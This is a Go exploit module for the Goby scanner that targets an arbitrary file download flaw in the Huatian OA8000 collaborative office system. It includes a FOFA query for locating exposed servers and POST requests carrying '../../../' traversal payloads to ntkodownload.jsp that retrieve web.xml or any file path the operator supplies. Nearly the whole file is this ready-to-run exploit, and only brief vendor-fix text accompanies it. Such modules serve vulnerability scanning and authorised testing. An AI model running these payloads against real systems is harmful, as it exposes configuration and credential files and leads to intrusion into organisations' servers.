package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": " Huatian power collaborative office system / oaapp / JSP / trace / ntkodownload JSP arbitrary file download vulnerability",
    "Description": "<p>Huatian power collaborative office system combines advanced management ideas and modes with software technology and network technology to provide users with a low-cost and efficient collaborative office and management platform.</p><p>Huatian power OA system has a vulnerability of arbitrary file download</p>",
    "Product": "Huatian-OA8000",
    "Homepage": "http://www.oa8000.com",
    "DisclosureDate": "2022-09-02",
    "Author": "ch0ing@qq.com",
    "FofaQuery": "body=\"/OAapp/WebObjects/OAapp.woa\" || body=\"/OAapp/htpages/app\"",
    "GobyQuery": "body=\"/OAapp/WebObjects/OAapp.woa\" || body=\"/OAapp/htpages/app\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.oa8000.com/\">http://www.oa8000.com/</a></p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filename",
            "type": "input",
            "value": "../../../OAapp/WEB-INF/web.xml,../../../Tomcat/webapps/OAapp/WEB-INF/web.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/OAapp/jsp/trace/ntkodownload.jsp",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "filename=../../../OAapp/WEB-INF/web.xml"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "web-app",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<?xml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/OAapp/jsp/trace/ntkodownload.jsp",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "filename=../../../Tomcat/webapps/OAapp/WEB-INF/web.xml"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "web-app",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<?xml",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/OAapp/jsp/trace/ntkodownload.jsp",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "filename={{{filename}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|((.|\\r|\\n)+)"
            ]
        }
    ],
    "Tags": [
        "Information technology application innovation industry",
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "华天动力协同办公系统 /OAapp/jsp/trace/ntkodownload.jsp 任意文件下载漏洞",
            "Product": "华天动力-OA8000",
            "Description": "<p>华天动力协同办公系统将先进的管理思想、管理模式和软件技术、网络技术相结合，为用户提供了低成本、高效能的协同办公和管理平台。</p><p>华天动力OA系统存在任意文件下载漏洞</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.oa8000.com/\">http://www.oa8000.com/</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞下载系统重要文件（如数据库配置文件、系统配置文件），并配合下载文件内容顺利进入数据库或者系统的敏感信息，导致网站或者服务器沦陷。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "信创",
                "文件读取"
            ]
        },
        "EN": {
            "Name": " Huatian power collaborative office system / oaapp / JSP / trace / ntkodownload JSP arbitrary file download vulnerability",
            "Product": "Huatian-OA8000",
            "Description": "<p>Huatian power collaborative office system combines advanced management ideas and modes with software technology and network technology to provide users with a low-cost and efficient collaborative office and management platform.<br></p><p>Huatian power OA system has a vulnerability of arbitrary file download</p>",
            "Recommendation": "<p>The&nbsp;vendor&nbsp;has&nbsp;released&nbsp;a&nbsp;bug&nbsp;fix,&nbsp;please&nbsp;pay&nbsp;attention&nbsp;to&nbsp;the&nbsp;update&nbsp;in&nbsp;time:<a href=\"http://www.oa8000.com/\">http://www.oa8000.com/</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "Information technology application innovation industry",
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10701"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
